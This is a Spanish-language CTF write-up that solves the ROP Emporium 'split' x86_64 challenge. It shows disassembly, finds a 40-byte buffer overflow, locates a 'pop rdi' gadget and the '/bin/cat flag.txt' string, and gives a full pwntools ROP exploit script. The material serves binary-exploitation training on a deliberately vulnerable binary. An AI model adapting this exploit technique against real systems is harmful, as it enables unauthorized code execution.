---
layout: post
title: Split ROP Emporium (x86_64)
comments: true
categories: [Pwn, Writeups, ROPEmporium]
---

Este será el primer post de los writeups de [ROP Emporium](https://ropemporium.com/challenge/split.html), obviaremos el reto *ret2win*, ya que es
excesivamente simple. Con esta serie de posts aprenderemos sobre una de las técnicas más utilizadas en la explotación de binarios, la 
[***ROP***]({% post_url /teoria/2024-08-15-ROP %}), ó *Return Orineted Programming* (Programación orientada a *return*).

## Reconocimiento

Como siempre comenzamos lanzando *checksec*:

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

Vemos que tan solo tiene el *NX bit*, por lo que el ataque será probablemente mediante técnicas de *ROP*.

Analizando con *gdb-pwndbg*:

**Funciones**
```
0x0000000000400697  main
0x00000000004006e8  pwnme
0x0000000000400742  usefulFunction
```

**Main**
```
0x0000000000400697 <+0>:	push   rbp
0x0000000000400698 <+1>:	mov    rbp,rsp
0x000000000040069b <+4>:	mov    rax,QWORD PTR [rip+0x2009d6]        # 0x601078 <stdout@@GLIBC_2.2.5>
0x00000000004006a2 <+11>:	mov    ecx,0x0
0x00000000004006a7 <+16>:	mov    edx,0x2
0x00000000004006ac <+21>:	mov    esi,0x0
0x00000000004006b1 <+26>:	mov    rdi,rax
0x00000000004006b4 <+29>:	call   0x4005a0 <setvbuf@plt>
0x00000000004006b9 <+34>:	mov    edi,0x4007e8
0x00000000004006be <+39>:	call   0x400550 <puts@plt>
0x00000000004006c3 <+44>:	mov    edi,0x4007fe
0x00000000004006c8 <+49>:	call   0x400550 <puts@plt>
0x00000000004006cd <+54>:	mov    eax,0x0
0x00000000004006d2 <+59>:	call   0x4006e8 <pwnme>
0x00000000004006d7 <+64>:	mov    edi,0x400806
0x00000000004006dc <+69>:	call   0x400550 <puts@plt>
0x00000000004006e1 <+74>:	mov    eax,0x0
0x00000000004006e6 <+79>:	pop    rbp
0x00000000004006e7 <+80>:	ret
```

**Pwnme**
```
0x00000000004006e8 <+0>:	push   rbp
0x00000000004006e9 <+1>:	mov    rbp,rsp
0x00000000004006ec <+4>:	sub    rsp,0x20
0x00000000004006f0 <+8>:	lea    rax,[rbp-0x20]
0x00000000004006f4 <+12>:	mov    edx,0x20
0x00000000004006f9 <+17>:	mov    esi,0x0
0x00000000004006fe <+22>:	mov    rdi,rax
0x0000000000400701 <+25>:	call   0x400580 <memset@plt>
0x0000000000400706 <+30>:	mov    edi,0x400810
0x000000000040070b <+35>:	call   0x400550 <puts@plt>
0x0000000000400710 <+40>:	mov    edi,0x40083c
0x0000000000400715 <+45>:	mov    eax,0x0
0x000000000040071a <+50>:	call   0x400570 <printf@plt>
0x000000000040071f <+55>:	lea    rax,[rbp-0x20]
0x0000000000400723 <+59>:	mov    edx,0x60
0x0000000000400728 <+64>:	mov    rsi,rax
0x000000000040072b <+67>:	mov    edi,0x0
0x0000000000400730 <+72>:	call   0x400590 <read@plt>
0x0000000000400735 <+77>:	mov    edi,0x40083f
0x000000000040073a <+82>:	call   0x400550 <puts@plt>
0x000000000040073f <+87>:	nop
0x0000000000400740 <+88>:	leave
0x0000000000400741 <+89>:	ret
```

**UsefulFunction**
```
0x0000000000400742 <+0>:	push   rbp
0x0000000000400743 <+1>:	mov    rbp,rsp
0x0000000000400746 <+4>:	mov    edi,0x40084a
0x000000000040074b <+9>:	call   0x400560 <system@plt>
0x0000000000400750 <+14>:	nop
0x0000000000400751 <+15>:	pop    rbp
0x0000000000400752 <+16>:	ret
```

Vemos que tenemos una vulnerabilidad de tipo *Buffer overflow*. Con *cyclic* podemos calcular el offset, que en este caso es **40**.

Vemos también que tenemos una función *usefulFunction*, que nos da una llamada a *system*. Sin embargo, en este caso, se llama a `"/bin/ls"`:

```
0x0000000000400746 <+4>:	mov    edi,0x40084a
0x000000000040074b <+9>:	call   0x400560 <system@plt>

[...]

pwndbg> x/s 0x40084a
0x40084a:	"/bin/ls"
```

Por lo que si conseguimos meter en *rdi* la cadena `"/bin/cat flag"`, nos imprimirá la flag. Por suerte dicha cadena existe en el binario:

```
pwndbg> search "/bin/cat"
Searching for value: '/bin/cat'
split           0x601060 '/bin/cat flag.txt'
```

Solo nos queda buscar un gadget que nos haga el trabajo. En mi caso utilizaré *ROPGadget* (con *ropper* no aparecía):

```bash
ROPgadget --binary split | grep "pop rdi"
0x00000000004007c3 : pop rdi ; ret
```

## Explotación

El script quedaría:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './split'

ip=""
port=30303

def start():
    if args.REMOTE:
        return remote(ip, port)
    else:
        return process(exe)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

padding = 40*b'A'

syscall = 0x000000000040074b
pop_rdi = 0x00000000004007c3
bin_cat = 0x601060

payload = padding + p64(pop_rdi) + p64(bin_cat) + p64(syscall)

io.send(payload)
io.interactive()
```

Al ejecutar nos dará la flag.

Este es un reto sencillito para calentar e ir afianzando los conceptos base. ¡Nos vemos en el siguiente post!
